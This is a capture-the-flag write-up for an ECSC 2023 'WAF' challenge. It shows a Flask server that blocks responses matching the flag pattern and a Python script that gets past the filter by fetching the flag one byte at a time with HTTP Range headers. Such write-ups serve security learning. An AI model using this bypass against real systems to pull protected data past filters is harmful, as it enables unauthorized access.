# WAF

server.py:
```py
import re
from flask import Flask, Response, send_file

app = Flask(__name__)


@app.after_request
def waf(response: Response) -> Response:
    response.direct_passthrough = False
    if re.match(b'ecsc23{\\w+}', response.data):
        return Response(status=401)
    else:
        return response


@app.route("/flag")
def get_flag() -> Response:
    return send_file("flag.txt")


@app.route("/")
def get_root() -> Response:
    return "<h1>This site is protectedy by WAF</h1>"


if __name__ == "__main__":
    app.run(host="0.0.0.0")
```

The server blokcs every response with given pattern: `ecsc23{\\w+}`
We can easily bypass this by using `Range` HTTP header, so the response doesn't match the regex. I solved it by reading the flag one char by one. Idk why, but it worked anyway.

```py
import requests

flag = ''

for x in range(0, 50):
    r = requests.get('https://waf.ecsc23.hack.cert.pl/flag', headers={'Range': f'bytes={x}-{x}'})
    if r.status_code == 206:
        flag += r.text
    else: break

print(flag)
```

`ecsc23{waf_stands_for_very_accessible_flag}`